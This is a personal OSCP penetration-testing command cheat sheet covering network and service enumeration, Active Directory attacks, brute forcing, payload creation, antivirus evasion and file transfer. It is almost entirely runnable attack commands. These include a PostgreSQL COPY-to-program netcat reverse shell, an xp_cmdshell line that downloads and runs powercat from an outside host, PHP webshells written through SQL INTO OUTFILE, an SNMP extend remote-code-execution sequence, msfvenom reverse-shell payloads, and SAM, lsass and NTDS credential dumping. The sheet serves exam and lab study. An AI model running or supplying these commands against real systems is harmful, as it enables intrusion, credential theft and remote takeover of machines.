# ⌨️ OSCP Commands - Quick Reference

I used this cheat sheet inside Obsidian due to its powerful customization options. You can see how it looks in Obsidian in the GIF below.

<div align="center">
    <img src=assets/obsidian.gif>
</div>

You can also download the Markdown file and use it in your own Obsidian setup. I’ll be publishing my full Obsidian vault with all configurations soon, so follow me to stay updated.

### Tool Docs
- [PowerView Docs](https://powersploit.readthedocs.io/en/latest/Recon/)
- [Netexec Docs](https://www.netexec.wiki/)

- https://github.com/dollarboysushil/oscp-cpts-notes
- https://github.com/0xsyr0/oscp

## Attacker Machine Commands 
### General Linux Commands
```shell
# to create list of IPs for TARGETS.txt
printf "%s\n" 192.168.0.{{1..5},8} > TARGETS.txt

sed '/^1/d' file.txt # for deleting all the lines that start with 1
sudo sed -i '1i ip hostname' /etc/hosts  # 1st line to insert/add
sudo sed -i '1d' /etc/hosts  # 1st line to delete/remove

# to use DC as a DNS Server for our Kali for only specific AD specific domains
sudo vim /etc/dnsmasq.conf

sudo vim /etc/resolv.conf
# add 127.0.0.1 as nameserver so we use dnsmasq
sudo systemctl restart dnsmasq

# UV command, to isolate python prog req dependencies
uv add --script <tool-python-name> -r requirements.txt
uv run <program-name>
# to quickly run those programs add the below shebang
#!/usr/bin/env -S uv run --script
sed -i '1i #!/usr/bin/env -S uv run --script' script.py

cut -d ' '
sed 
paste -d ':' username passwords  # to combine in columns
awk '{print $5}' file.txt # to effectively get the columns 5 data

# for quick parsing of json files
jq '.computers[].Name'  jsonfile.json
jq '.computers[] | {Name,field2}'  jsonfile.json
'select(.label | test("MANAGEMENT"))' # search for specific entry on specfiic condition
'select(.Properties.AdminCount == 1)'
cat domain_users.json | jq  -r '.[].attributes.sAMAccountName[]'  # -r for not showing double quotes
# to take specific ip scan from the All_IPs_Nmap Scan
sed -n '/scan report.*244/,/Nmap scan report/p'  all_Nmap_output | xclip -selection clipboard


binwalk -Me image.png
exiftool -u -a <image/file>
file <file>


grep -irl 'patter' .
grep -irn 'patter' .


sudo update-alternatives --install /usr/bin/python python \
/usr/bin/python3.5 3


# in case can't open interactive editor inside the revshell
cat <<'EOT'> /anyfile
content
EOT

```
### General Enumeration
```shell
# Enumeration
autorecon -t Targets.txt


# live host scanning 
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

nmap -sn -iL TARGETS.txt
nmap -sn 192.168.0.1-254 # ping sweep

nmap -p 80 192.168.50.1-253 -oG web-sweep.txt # host scan can be done through this



# Port Scanning
nc -nv -w 1 -z 192.168.10.1 1-1000 # tcp scan, shows timeout or open ports extra v -nvv for every output
nc -nv -u -z -w 1 192.168.50.149 120-123 # for udp scan, returns the service name. Has to be run mutliple times


while IFS= read -r port; do
    test_url="${base_url}:${port}"
    response=$(curl -skL --proxy "$proxy_url" --max-time 5 --connect-timeout 3 "$test_url" 2>/dev/null)

    if ! echo "$response" | grep -q "ERROR"; then
        echo "[+] $test_url may be open behind the proxy"
    else
        echo "[-] $test_url seems closed or filtered"
    fi
done < top_ports.txt


nmap -sT <ip> # this will be helpful when dealing with certain kind of proxies in between the target
sudo nmap -sU -sS <ip> 
sudo nmap $IP -sU --max-rtt-timeout 100ms --max-retries 1 --open -T4 -oA udpscan.txt
nmap -T4 -p- ip  # incase of unstable network
rustscan -a 127.0.0.1 --range 1-65535 -- -A -Pn  | tee portscan1.txt # prefered

# List of top ports 
cat /usr/share/nmap/nmap-services | grep -v '^#' | sort -k3 -nr | head -n 100
cat /usr/share/nmap/nmap-services | grep -v '^#' | sort -k3 -nr | head -n 100 | awk '{split($2, a, "/"); print a[1]}' > top_ports.txt



# specific to AD
nxc smb ip # to quickly look for domain nam
nmap -script dns-srv-enum --script-args "dns-srv-enum.domain='domainname'"

sudo responder -A -I tun0 # must use this, only allowed in analyze mode not poisoning
# and capture NTLMv2 hashes like typing `dir \\attacker-ip\nonshare` 
hashcat -m 5600 <hash file> <password file> --force


# firewall check
If a firewall is in place, an ACK scan (`nmap -sA`) shows:  
`Not shown: 994 filtered ports`

If no firewall is present, the output shows:  
`Not shown: 999 unfiltered TCP ports (reset)`

hping3 -S -p 80 -c 1 <target>   # SYN to port 80
hping3 -S -p 81 -c 1 <target>   # SYN to a random port
# RST response = port is closed, but host reachable
# No response = likely dropped silently (firewall)
# ICMP unreachable = network filter in place
nmap --script=firewalk --traceroute -Pn -p 1-100 <target>  # [Firwalk nse](https://nmap.org/nsedoc/scripts/firewalk.html)



# Port knocking
/etc/init.d/knockd # config
knock <target-ip> 571 290 911  # port in seq
for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43 && sleep 1; done



# SQL Enumeration
mysql -u root -p'root' -h 127.0.0.1 -P 3306 --skip-ssl
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth # windows-auth forces NTLM instead of kerberos
impacket-mssqlclient hostname.domain.com -k -port <no>


# CMS
joomscan

# Wordpress Scanning
wpscan --url http://ip --disable-tls-checks --api-token <redacted> # WPVulnDB API from wpscan
wpscan --url http://ip --disable-tls-checks --enumerate u --api-token <redacted>
wpscan --url http://offsecwp --enumerate ap --plugins-detection aggressive -t 40 --api-token <redacted>
# pass brute
wpscan --url http://example.com/ -e u --passwords /usr/share/wordlists/rockyou.txt
wpscan --url http://example.com/ -U admin --passwords /usr/share/wordlists/rockyou.txt

# Drupal
droopescan scan drupal -u http://example.org/ -t 32
# find version > /CHANGELOG.txt

### Adobe Cold Fusion
# check version /CFIDE/adminapi/base.cfc?wsdl
# fckeditor Version 8  LFI > http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

# Vulnerability Scanning using NSE
ls -1 /usr/share/nmap/scripts/<servic>* # scripts.db (for category check) https://nmap.org/nsedoc/scripts/
nmap --script-help http-headers

grep <category> /usr/share/nmap/scripts/scripts.db
nmap --script vulners # very bulky data for single serrvice
--script "vuln" # for vuln category
# we can download custom nse scripts, download and shift to nmap scripts folder then
sudo nmap --script-updatedb
sudo apt update && sudo apt install exploitdb # to update the local copy of Exploit Database archive
searchsploit --id httpd
searchsploit --id openssh 7.2p2
# some vulns to look for
nmap -sV --script http-shellshock



# Git commands
git log
git show

# [gittools](https://github.com/internetwache/GitTools)
gitfinder
git-dumper http://ip/.git/ destdir
gitextractor gitdir outdir

git log
git branch
git branch -a
git config list
git status
git restore --staged README.md # in order to restory file from staged
git diff previous_commit_hash new_commit_hash
git clone file:///filepath

# to clone repository inside our kali machine from the victim machine
GIT_SSH_COMMAND='ssh -i id_rsa -p 22' git clone git@victim_ip:/git-server

.git/logs/HEAD  # to research logs manually
```

### Service Enumeration

#### DNS 
```shell
# DNS Enumeration
host -t <recordtype> hostname.com # recordtype = mx, cname, a, txt
host -a hostname.com
hostname -t NS hostname.com
host -l domain.con dnsserver # to do zone transfer
nslookup hostname 8.8.8.8
dig @<serverip> hostname ANY 
dig axfr @namserver megacorpone.com # zone transfer

dnsrecon -d example.com -t std
dnsrecon -d example.com -D ~/wordlist.txt -t brt
dnsenum offseclab.io --threads 100
```

#### HTTP(S)
```shell
# WEB DAV
davtest --url http://x.x.x.x

# to interact with webdav server
cadaver http://<IP>/<webdavpath>
dav> put /usr/share/webshells/asp/webshell.asp

# or manually
# let's suppose only html file is allowed in webdav using PUT method
curl -X PUT http://10.10.10.15/test.html -d @test.html
# we can PUT and then use MOVE method to rename the file extension to aspx, php or any exe to get revshell
curl -X MOVE --header 'Destination:http://10.10.10.15/test.aspx' 'http://10.10.10.15/test.html'
# to verify
curl http://10.10.10.15/test.aspx


nikto http://website.com

# to list http headers only
curl -I http://website.com

openssl s_client -connect $ip:443


# apache http 2.4.49 exploit
for i in {'user2','user1','user2','user3'};do echo "extracting $i"; ./apache2.4.49.sh webtargets.txt "/home/$i/.ssh/id_ecdsa"; done
# check every id file
```
#### SMB
```shell
# SMB & netbios enumeration
sudo nbtscan -r 192.168.50.0/24  # it enumerates netbios name service runs on 137
nmap -p 445 --script smb* <target>
enum4linux -a <target>
enum4linux -u 'domain/user' -p 'pass' -a <target>
smbclient -L //<target> -N
smbclient -L //<target> -U <username>%<password>
smbclient //<target>/<sharename> -U <username>
smbmap -H <target> -u <user> -p <pass> -R

for ip in $(cat smbhosts.txt);do enum4linux -U $ip >> enum4.out;done


smbclient > prompt off
smbclient > recurse on
smbclient > mget *


nxc smb <iprange>  # only search for windows machine
nxc smb <ipraneg> -u '' -p '' --shares # to look for null session
nxc smb <iprange> -u 'guest' -p '' --shares

nxc smb <ip> -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True # to download all the file from smb shares
nxc smb <ip> -u 'user' -p 'pass'  --user # try enumerate thru guest user and null session

nxc smb <ip> -u 'user' -p 'pass' --rid-brute # to enumerate users using rid bruteforcing
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol # domain pass policy
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt # to check which target hasn't enforced smb signing so we can relay ntml

netexec smb 172.16.238.83   -u 'user' -p 'pass' --spider C --pattern txt,pdf,doc,docx 

# ADMINS RIGHTS NEEDED

# sensitive data dumping, if user is admin
nxc smb ip -u user -p pass --sam
nxc smb ip -u user -p pass -M lsassy
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil  # dumps ntds.dit and SYSTEM and parse these using secretsdump
# enumerate loggedon-users if you have admin rights on that machine then impersonate as that user
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users

netexec smb <target-ip> -u <username> -p <password> --exec-method smbexec -x "whoami"

impacket-smbclient "user":'password'@ip

# In case of the error in smbclient copying large files
# parallel_read returned NT_STATUS_IO_TIMEOUT

smbclient --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t <timout>

# OR Use the below 

smbclient -m SMB2 -N '//server/share' -c 'timeout 120; iosize 16384; get \"My Files\More Files\"\version_1\file.txt' -U <username>


# Active Directory
Groups.xml # could have passwords in it
# AES encrypted password can be decrypted as it's available everywhere using tool too
gpp-decrypt <aes_enc_pass>
```
#### SNMP
```shell
# SNMP Enumeration
download-mibs # so instead of OID, we can get MIB for easier enumeration.
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
# onesixtyone tool setup
echo public > community
echo private >> community
echo manager >> community # OR /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips

# SNMP querying
snmpwalk -c public -v1 -t 10 192.168.50.151
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25 # oid for user enumeration, specific to server it's for windows
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2 # currently running processes
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2 # softwares installed on the machine
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3 # list all the listening TCP port connections
# https://mibbrowser.online/mibdb_search.php



# RCE or script execution

# NET-SNMP-EXTEND-MIB executes the mentioned script when queried if these options are set to 1
# These OIDs must be set correctly:
# - nsExtendExecType = 1 (exec)
# - nsExtendRunType = 1 (run-on-read)
# - nsExtendStatus = 1 (active)
snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects #get extended
snmpwalk -v 1 -c public 192.168.10.10  NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# How to check writable permission on SNMP
# Try writing a test OID (like sysContact). If it succeeds, SNMP is writable.
snmpset -v 1 -c public $IP SNMPv2-MIB::sysContact.0 s "test"

# If writable, try checking access to extend entries (optional)
snmpwalk -v 1 -c public $IP NET-SNMP-EXTEND-MIB


# snmpset command for RCE
# This creates a new extend entry named "HAX" that runs `/bin/bash -c 'id > /tmp/pwned'`
snmpset -v 1 -c public $IP \
  NET-SNMP-EXTEND-MIB::nsExtendCommand.\"HAX\" s "/bin/bash" \
  NET-SNMP-EXTEND-MIB::nsExtendArgs.\"HAX\" s "-c 'id > /tmp/pwned'" \
  NET-SNMP-EXTEND-MIB::nsExtendExecType.\"HAX\" i 1 \
  NET-SNMP-EXTEND-MIB::nsExtendRunType.\"HAX\" i 1 \
  NET-SNMP-EXTEND-MIB::nsExtendStatus.\"HAX\" i 1

# Trigger the RCE
snmpwalk -v 1 -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"HAX\"

# Cleanup (optional)
snmpset -v 1 -c public $IP NET-SNMP-EXTEND-MIB::nsExtendStatus.\"HAX\" i 6  # destroy(6)
```
#### SMTP/POP3/IMAP
```shell
# SMTP Enumeration
nmap x.x.x.x --script=smtp* -p 25
# smtp-open-relay, smtp-commands
# smtp commands after connecting through netcat
smtp> VRFY <emailaddr>
nc -C 192.168.227.199 25 # sometimes server wait for carriage return to in case of windows \r\n
telnet ip 25
#this can be done through evolution GUI tool
sudo swaks -t victim@domain.com --from test@domain.com -ap --attach @config.Library-ms --server 192.168.227.199 --body @body.txt --header "Subject: Problems" --suppress-data
# user enumeration
smtp-user-enum -M RCPT -D domain.com -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.227.199

# POP3
#connect and check for banner
telnet $ip 110

EHLO all

#guess login credentials
USER pelle
PASS admin
#list all emails
list
#retrieve email number 5 for example
retr 5
```
#### FTP
```shell
ftp -A anonymous@192.168.10.1  # -A more stable
ftp > passive
ftp > binary
ftp > help
```
#### RPC
```shell
rpcinfo $IP

rpcclient -U "corp.com/user" dc-ip
rpcclient -N dc-ip # Null
rpcclient -U "" <IP> # Anonymous
rpcclient -U "guest&" <IP> # Public
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pw-nt-hash

rpc> lookupdomain corp.com
rpc> help

enumdomusers
enumdomgroups
lookupnames <username>
enumprivs
queryuser <user>
querygroup <group>
querydispinfo
srvinfo

chgpasswd
setuserinfo
# to change pass in case of GenericAll Permission
rpcclient> setuserinfo2 username 23 newpass

# KALI net command

# We can execute net commands remotely from kali using
# Enumerate users in a Windows/AD domain via RPC
net rpc user -U 'DOMAIN/username%password' -S DC_IP
# Reset a user's password if you have proper rights (e.g., GenericAll)
net rpc password "TargetUser" "newP@ssword2022" -U "nagoya-industries.com"/"controlleduser"%"Nagoya2023" -S $IP1            
# Shut down or reboot a remote machine via RPC
net rpc shutdown -S TargetIP -U 'DOMAIN/admin%Pass'   # clean shutdown
net rpc shutdown -r -f -S TargetIP -U 'DOMAIN/admin%Pass'  # forced reboot
# Manage remote Windows services
net rpc service stop ServiceName -S TargetIP -U 'DOMAIN/admin%Pass'
net rpc service start ServiceName -S TargetIP -U 'DOMAIN/admin%Pass'


net service list                                # List services
# User & group management
net user add <username> <options>               # Add local user
net user delete <username>
net group addmember <group> <user>
net group removemember <group> <user>

```

#### LDAP
```shell
sudo nmap $IP1 -p389 --script=ldap*

# check null credentials are valid
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
# without creds
ldapsearch -v -x -b "DC=domain,DC=com" -H "ldap://192.168.x.x" "(objectclass=*)"

# LDAP Enumeration
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <ip>
cat domain_users.json | jq  -r '.[].attributes.sAMAccountName[]'  > domain_users.txt

ldapsearch -x -H ldap://<ip> -D "<domain>\\" -W -b "DC=<domain>,DC=<tld>" 
# find all users
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(objectClass=user)"

# find a specific user by username
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(sAMAccountName=<name>)"
# find all groups
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(objectClass=group)"
# find groups a specific user belongs to
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(&(objectClass=group)(member=CN=John Doe,CN=Users,DC=<domain>,DC=<tld>))"
# find all computer objects
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(objectClass=computer)"


windapsearch -d <domain> -u <username> -p <password> -m users --dc-ip $IP1
windapsearch -d <domain> -u <username> -p <password> -m members -s 'domain admin'
-m groups
computers
privileged-users

# LAPS Dumping
netexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
ldapsearch -x -H "ldap://dc-ip" -D "domain\user" -w "password" -b "dc=domain,dc=com" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd

```
#### Oracle Database (1521)
```shell
# [odat wiki](https://github.com/quentinhardy/odat/wiki)
odat sidguesser -s 10.10.10.82 -p 1521
odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /opt/myarsenal/odat/accounts/accounts-multiple.txt

#  /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt odat/accounts/

# vim command to repace space with forward slash
# :%s/ /\//g


# ODAT has a utlfile module that allows you to upload, download or delete a file
odat utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp rem_shell.exe local_shell.exe --sysdba

# to execute that shell
odat externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp rem_shell.exe local_shell.exe --sysdba


dbeaver # to connect to oracle database easily

odat search -s $SERVER -d $SID -U $USER -P $PASSWORD --sql-shell # not tested
```
#### Unknown ports
```shell
nc -nv $IP port_number
# try pressing enter
help
version

# port 3003
nc -nv $IP 3003 
help
version

```
#### SQL Services
- MSSQL 1433
- MySQL 3306
- PostgreSQL 5437
```shell
# MySQL
mysql -u root -p 'root' -h 192.168.10.10 -P 3306

select version(); | show databases;  | use databse | select * from users; | show tables |  select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre

mysqldump --databases Magic -<usser> -<pass>


# MS SQL
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
impacket-mssqlclient Administrator:'pass'@x.x.x.x -windows-auth

SELECT @@version;  | SELECT name FROM sys.databases;  | SELECT _FROM offsec.information_schema.tables;  |  select_ from offsec.dbo.users;

netexec mssql x.x.x.x --use-kcache -x 'whoami /all' --port 14330


# PostgreSQL
psql -U postgres -p 5437 -h IP  
select pg_ls_dir('./');  | select pg_ls_dir('/etc/password');  | select pg_ls_dir('/home/wilson');  | select pg_ls_dir('/home/Wilson/local.txt');
```
##### Sql Commands
```sql
-- MySQL 
select version();
select system_user();
show databases;
use databasename;
show tables;
Select * FROM database.usertable 
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'TABLES' AND TABLE_SCHEMA = 'information_schema';
SELECT GROUP_CONCAT(col1,'+',col2,':') from tables; -- combines multiple rows and columns into single entry

-- indirect cmd exec through file upload
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/tmp/webshell.php' -- error displayed shouldn't impact the file creation

9999 union select 1,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php'


-- MS SQL
select @@version;
use database;
SELECT name FROM sys.databases;
SELECT * FROM <database>.information_schema.tables;
select * from database.dbo.users;
SELECT name FROM sys.tables; -- to see all the tables within the specific database
SELECT table_catalog, table_name, column_name FROM information_schema.columns 
SELECT * FROM sysusers;
SELECT name, type_desc FROM sys.all_objects;
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'your_table_name' AND TABLE_SCHEMA = 'dbo';
SELECT string_agg(COLUMN_NAME,',') FROM database.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';
string_agg(table_name,',')

-- To enumerate users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

-- SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
-- Link : [hacktricks impersonation of the users](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#impersonation-of-other-users)
-- Find users you can impersonate 
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
--Check if the user "sa" or any other high privileged user is mentioned # Impersonate sa user 
EXECUTE AS LOGIN = 'sa' 
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

-- For enabling xp_cmdshell with having privs
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
-- for cmd exec
EXECUTE xp_cmdshell 'whoami';
-- During sql exploitation combine all of these command in stack SQL query
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.119.3/psh_scripts/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell ';


-- POSTGRESQL
string_agg(table_name,',') -- group_concat alternative
SELECT usename, passwd FROM pg_shadow
-- for cmd exec, use ; semicolon to end the previous statement because COPY command runs as a seperate SQL comand in stacked SQL query
COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';

psql> \l  -- to list the database 
psql> \c database -- to connect to database like 'use database' in mariadb/mysql 
psql> \dt  -- list available tables in the connected dtabase
psql> \dn  -- list all schemes of currently connected database
psql> \? --help
```

### 🔢Bruteforcing
- Go slow to avoid lockouts (respect domain policy)
- Spray one password across all usernames
- Try `username:username` as creds
- Try  `password` password
- try to use `admin:admin`
- Empty Password too
- Collect credentials from every place and bruteforce and spray it
- Use `cewl` or similar to generate wordlists from websites
- Collect creds from:
	- SMB/FTP shares, web apps, exposed files, Git leaks
```shell

# In case of unstable network, adjust the the mtu by decreasing till you are good to go
sudo ifconfig tun0 mtu 1250
ping -M do -s 1300 <vpn-ip>   # -M do = don't fragment
# If it fails, your MTU is too high. Keep lowering the -s size until ping works.

# HYDRA
hydra -h 
hydra http-port-form -U
hydra -l admin -P wordslist.txt 192.168.104.52 http-post-form "/login.php:username=^USER^&password=^PASS^&debug=0:H=Content-Type: application/x-www-form-urlencoded:Failed"
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
# Hydra doesn't support smbv2 or v3 by default
# -I = ignore restore file 
# -V = verbose
# for base64 encoding 
":username=^USER64^&password=^PASS64^:C=/:F=403"


# medusa and ncrack are better alternative to hydra
ls /usr/lib/x86_64-linux-gnu/medusa/modules/
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/passwords.txt -M smbnt -t 10 > medusa_results.txt
grep 'ACCOUNT_FOUND' medusa_results.txt


# rdp can be bruteforce using hydra or through smb bruteforcing using netexec
netexec smb <target-ip> -u <username> -p wordlist.txt -d corp.co --continue-on-success
# we can also use nxc to check which user is allowed to rdp in which machine using screenshot
netexec rdp <ip-range> -u user -p pass -d corp.com --continue-on-success --screenshot --screentime <time> # --nla-screenshot

kerbrute passwordspray -d corp.com adusers.txt 'Nexus123!' --dc 192.168.237.70


# FFUF
ffuf -w wordslist.txt  -X POST -d 'username=admin&password=FUZZ' -u http://192.168.104.52/login.php -fr "Failed" -H "Content-Type: application/x-www-form-urlencoded"


## GOBUSTER
# -f to append trailing slash, sometimes /api results in error /api/ reveals data
gobuster dir -u -r http://10.10.10.10:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt,asp,aspx,html,pdf,doc,bak,zip -p pattern | tee dir.enum

zip,tar,tar.gz,txt,php
# Try to add {GOBUSTER}/ pattern because sometimes ip/cgi-bin results 404 and ip/cgi-bin/ results in 403
# pattern file can consists entries like {GOBUSTER}/v1

feroxbuster --url http://192.168.175.46/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html


gobuster vhost -u "http://10.10.148.4" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 


## JOHN
ls /usr/bin/*2john /usr/sbin/*2john
john --list=formats | grep -i 
john --format=nt --wordlist=rockyou.txt hash # mentioning format is important, somtimes it can throw an error during cracking
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# for external rule file using --config parameter otherwise by default /etc/john/john.conf
john --wordlist=rockyou.txt --rules=MyRules --config=custom.conf --format=<hash-format> <hashfile>


## HASHCAT
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
hashcat -m 0 hash.txt /usr/share/wordilsts/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule


## CRACKMAPEXEC
crackmapexec mssql 192.168.227.18 -u Administrator -p test_wordlist.txt --local-auth


# Kerberos user enumeration
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=klay.thm,userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt klaycomputer.klay.thm
kerbrute userenum --dc 10.10.58.86 -d klay.thm /usr/share/seclists/Usernames/Names/names.txt

# SMB bruteforcing


## BURPSUITE Options
## for csrf enabled brute forcing
Project options -> sessions -> add new rule -> add macro 
get csrf token from login page then configure item and custom parameter location and add parameter name.
enable tolerate url mismatch and set scope to intruder and repeater
for proper csrf_token retrievel set to max concurrent = 1
```
#### Wordlist
```shell
printf "%s\n" 192.168.237.{70..76} > wordlist.txt


# Wordlist
while IFS= read -r url; do
    cewl -d 2 "$url" >> wordlist.txt  # also use --lowercase option,
done < urls.txt

crunch 6 6 -t knownpass%%% > wordlist   # % for digits  , for Uppercase  @ lowercase ^ symbols
crunch 4 6 abcd123 -o wordlist.txt # pass of 4 to 6 characters using charset

# wordlist mutation
hashcat -r demo.rule --stdout demo.txt  # [All the Rules listed on hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
# /usr/share/hashcat/rules : more rules provided by hashcat

# to use hashcat rules inside john add rule name 
# [List.Rules:sshRules] inside /etc/john/john.conf
john --wordlist=test.txt --rules --stdout

# to transfer rules from hashcat to john
 (echo '[List.Rules:best64]' && cat /usr/share/hashcat/rules/best64.rule ) >> custom64.conf

cupp -i

creds search <appname> # for default creds

# username generator
nano names.txt # add full names
awk '{print $2, $1}' names.txt >> names.txt
username_generator.py -w names.txt -u | sort -u > usernames.txt

```
##### Some Important Mutation rules
- /usr/share/hashcat/rules/rockyou-30000.rule
- /usr/share/hashcat/rules/best64.rule
##### Some important wordlists
Use cewl tool to crawl website specific login creds.
- /usr/share/wordlists/dirb/common.txt 
- /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
- /usr/share/dirb/wordlists/small.txt
- **/usr/share/wordlists/dirb/others/names.txt**
- /usr/share/seclists/Discovery/Web-Content/directory-list-*
- /usr/share/wordlists/fasttrack.txt
- /usr/share/metasploit-framework/data/wordlists/

```shell
# [All the Rules listed on hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

: # no rule apply
$1 c $!    # hashcat rule content, ends with 1! and capitalize 1st character Most common one
$! c $1
$1 $2 $3 c $!
$1 $2 $3 c $@
$1 $2 $3 c $#
$1 $2 $3 c $!

# Also check other users password in order to get an idea of rules
strings -n 7  # to filter out minimum length password from wordlits
# using the rule fiel
hashcat -r demo.rule --stdout demo.txt
```

### 💥Exploitation
#### Payload Creation

Check All The Payload Code: [[Code & Exploit Cheatsheet#Victim Machine Payloads]]
```shell
# cross compilation
x86_64-w64-mingw32-gcc windows_service.c -o service.exe  # for 64 bit
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe  -lws2_32  # for 32 bit
gcc -static -m32 code.c -o test  # for 32 bit linux
gcc -static code.c -o test  # for cross-compilation 


# MSF Venom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > mal_reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service > mal_service.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c -e "x86/shikata_ga_nai" -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

```
#### Evasion
```shell
# to encode and obfuscate powershell scripts in order to bypass AV
powershell-encoder.py
pwsh> InvokeStealth.ps1

shellter # for stealth mode it needs meterpreter shell otherwise it will crash
# Binaries to hide shell within Putty.exe, Spotify installer, sysmon.exe

veil # generating evasive metasploit payload
```
### 🚚File Transfer (Delivery)

[More file transfer techniques](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/file-transfer-techniques)

```shell
# Python web server
python -m http.server

# ftp server
python3 -m pyftpdlib -w -p 21 -u ignite -P 123 # skip -u -P for anonymous login

# Smb share
impacket-smbserver sharename /tmp/smbshare -smb2support -username 'test' -password 'test'# for no auth -username '' -password '' also set chmod 777 temp  
net user \\ip\sharename /user:test test  # on windows side

# webdav
